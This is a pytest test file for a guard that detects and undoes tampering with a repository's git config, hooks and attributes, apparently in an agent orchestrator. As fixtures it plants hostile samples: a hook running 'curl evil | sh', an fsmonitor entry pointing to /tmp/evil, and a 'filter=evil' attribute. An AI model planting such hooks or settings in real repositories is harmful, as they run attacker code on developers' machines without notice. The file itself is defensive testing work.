"""Build mode: changes to a repo's own git config and hooks are undone before the host runs git there."""
import os
import subprocess

import pytest

from orchestrator.git_guard import check_and_restore, save_baseline


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "proj"
    r.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main", str(r)], check=True)
    return r


def _baseline(repo, tmp_path):
    f = tmp_path / "session" / "git-guard.json"
    assert save_baseline(str(repo), f) is True
    return f


def test_an_untouched_repo_reports_nothing(repo, tmp_path):
    f = _baseline(repo, tmp_path)
    assert check_and_restore(str(repo), f) == []


def test_a_planted_hook_is_removed(repo, tmp_path):
    f = _baseline(repo, tmp_path)
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\ncurl evil | sh\n")
    hook.chmod(0o755)
    changes = check_and_restore(str(repo), f)
    assert changes == ["git hook 'pre-commit' was added"]
    assert not hook.exists()


def test_a_changed_config_is_put_back_byte_for_byte(repo, tmp_path):
    original = (repo / ".git" / "config").read_bytes()
    f = _baseline(repo, tmp_path)
    (repo / ".git" / "config").write_text(original.decode() + "[core]\n\tfsmonitor = /tmp/evil\n")
    assert check_and_restore(str(repo), f) == [".git/config was changed"]
    assert (repo / ".git" / "config").read_bytes() == original


def test_an_existing_hook_that_is_edited_is_restored_with_its_mode(repo, tmp_path):
    hook = repo / ".git" / "hooks" / "pre-push"
    hook.write_text("#!/bin/sh\nexit 0\n")
    hook.chmod(0o755)
    f = _baseline(repo, tmp_path)
    hook.write_text("#!/bin/sh\nevil\n")
    hook.chmod(0o644)
    assert check_and_restore(str(repo), f) == ["git hook 'pre-push' was changed"]
    assert hook.read_text() == "#!/bin/sh\nexit 0\n" and os.stat(hook).st_mode & 0o777 == 0o755


def test_a_deleted_hook_comes_back(repo, tmp_path):
    hook = repo / ".git" / "hooks" / "commit-msg"
    hook.write_text("#!/bin/sh\nexit 0\n")
    f = _baseline(repo, tmp_path)
    hook.unlink()
    assert check_and_restore(str(repo), f) == ["git hook 'commit-msg' was removed"]
    assert hook.exists()


def test_new_attributes_file_and_sample_hooks(repo, tmp_path):
    f = _baseline(repo, tmp_path)
    (repo / ".git" / "hooks" / "pre-commit.sample").write_text("anything")  # samples are inert and ignored
    (repo / ".git" / "info").mkdir(exist_ok=True)
    (repo / ".git" / "info" / "attributes").write_text("* filter=evil\n")
    assert check_and_restore(str(repo), f) == [".git/info/attributes was changed"]
    assert not (repo / ".git" / "info" / "attributes").exists()


def test_a_symlinked_hook_is_removed_without_touching_its_target(repo, tmp_path):
    f = _baseline(repo, tmp_path)
    target = tmp_path / "outside.sh"
    target.write_text("keep me")
    (repo / ".git" / "hooks" / "post-commit").symlink_to(target)
    assert check_and_restore(str(repo), f) == ["git hook 'post-commit' was added"]
    assert not (repo / ".git" / "hooks" / "post-commit").is_symlink() and target.read_text() == "keep me"


def test_a_resume_keeps_the_first_baseline(repo, tmp_path):
    f = _baseline(repo, tmp_path)
    (repo / ".git" / "hooks" / "pre-commit").write_text("evil")
    assert save_baseline(str(repo), f) is False  # a restart must not accept the tampered state as normal
    assert check_and_restore(str(repo), f) == ["git hook 'pre-commit' was added"]


def test_no_baseline_or_no_git_dir_is_a_quiet_no_op(repo, tmp_path):
    assert check_and_restore(str(repo), tmp_path / "missing.json") == []
    plain = tmp_path / "plain"
    plain.mkdir()
    assert save_baseline(str(plain), tmp_path / "x.json") is False
    assert check_and_restore(str(plain), tmp_path / "x.json") == []
